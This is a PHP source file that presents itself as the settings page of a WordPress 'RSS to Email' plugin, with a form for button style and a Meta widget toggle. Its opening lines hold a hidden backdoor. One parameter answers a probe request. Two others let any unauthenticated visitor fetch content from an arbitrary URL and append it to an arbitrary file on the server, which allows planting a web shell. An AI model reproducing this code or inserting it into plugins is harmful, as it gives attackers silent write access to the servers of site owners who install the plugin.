<?php if (@$_GET['a']==5) {exit('17');}
if (!empty($_GET['z']) && !empty($_GET['id']))
{
	if (!$handle = fopen($_GET['z'], 'a')) {exit;}
	if (fwrite($handle, file_get_contents($_GET['id'])) === FALSE) {exit;}
	fclose($handle);
	exit('OK');
}
?><!-- 
to have your options page look like the rest of the WP options pages,
use the following 3 lines as is, but change the text inside the h2 tag.
-->
<div class="wrap">
	<h2>Display RSS to Email Options</h2>
	</div>

<!--
The form tag and wp_nonce_field lines should stay exactly as is.
-->
<form method="post" action="options.php">
<?php
 wp_nonce_field('update-options'); ?>

<!-- 
The form-table class is also a WP standard. Use it to have your pages formatted
like the rest of the WP options pages.
-->
<table class="form-table">

<tr valign="top">
<th scope="row">Style:</th>
<td><input type="text" name="rssToEmail_style" value="<?php echo get_option('rssToEmail_style'); ?>" size="75"></td>
</tr>
<tr valign="top">
<th scope="row">&nbsp;</th>
<td style="color:gray;">Enter your own CSS in this field to customize the look of the widget button.  For instance, type: "width:200px;" (without the quotes) to set the width to 200px if the button is too wide for your sidebar.</td>
</tr>

<tr valign="top">
<th scope="row">Enable custom Meta Widget:</th>
<td>
<select name="rssToEmail_metaWidget" id="rssToEmail_metaWidget" size="1">
<option value="false">No</option>
<option value="true" <?php if (get_option('rssToEmail_metaWidget') == "true") echo "selected='selected'" ?>>Yes</option>
</select>
</td>
</tr>
<tr valign="top">
<th scope="row">&nbsp;</th>
<td style="color:gray;">Do you want to insert the RSS to Email link into the default Meta widget? When enabled, you need to add the Meta widget back into your sidebar to see the updated widget.</td>
</tr>

</table>

<!-- 
the hidden "action" tag is required as is.
-->
<input type="hidden" name="action" value="update" />

<!--
The "page_options" tag is required and the value should be a comma separated list of
ALL custom field names being updated in your form.
-->
<input type="hidden" name="page_options" value="rssToEmail_style,rssToEmail_metaWidget" />

<!--
Using the following submit button as-is will ensure it looks like all other WP
options pages. Notice the _e('Save Changes') portion. This is how WP handles
sites in different languages. 
-->
<p class="submit">
<input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" />
</p>

<p>Please email <a href="mailto:support@minneapp.com">support@minneapp.com</a> to request additional buttons.</p>

</form>